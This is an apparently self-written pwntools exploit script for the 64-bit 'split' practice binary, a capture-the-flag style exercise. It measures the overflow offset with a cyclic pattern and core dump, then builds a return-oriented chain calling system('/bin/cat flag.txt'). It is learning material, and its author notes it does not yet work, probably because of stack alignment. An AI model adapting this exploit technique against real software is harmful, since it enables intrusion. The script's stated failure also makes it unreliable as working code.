# NOTE: This does not work. I do not yet know why
# TODO

# See 32 bit solution for more explanations

from pwn import *

# Load binary into pwntools
elf = context.binary = ELF('split')

# Enable verbose logging
context.log_level = 'debug'


# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of ESP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

#print length of the buffer
info("%s bufferlen", cyclic_find(pattern))

# I want system(/bin/cat flag.txt), so I need to get the correct
# references

# Print system address
system = elf.symbols.system
info("%#x system", system)

# Print reference to "/bin/cat flag.txt"
cat = next(elf.search(b'/bin/cat flag.txt'))
info("%#x reference to /bin/cat flag.txt", cat)

# We need to set up the stack. pwnlib knows what to do.
# This is different than the 32 bit case, as we need to push the
# reference to cat to the rdi register
rop = ROP(elf)
rop.system(cat)

info(rop.dump())

# Craft a new payload which puts our fake stack at the correct offset
payload = flat({
    pattern: rop.chain()
})

with open("payload.txt", "wb") as f:
    f.write(payload)

# Fails sometimes due to the MOVAPS issue.
# The stack needs to be 16 Byte aligned.

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.wait()
io.recv()

# io.recvuntil("Thank you!\n")

# # Get our flag!
# flag = io.recvline()
# print(flag)

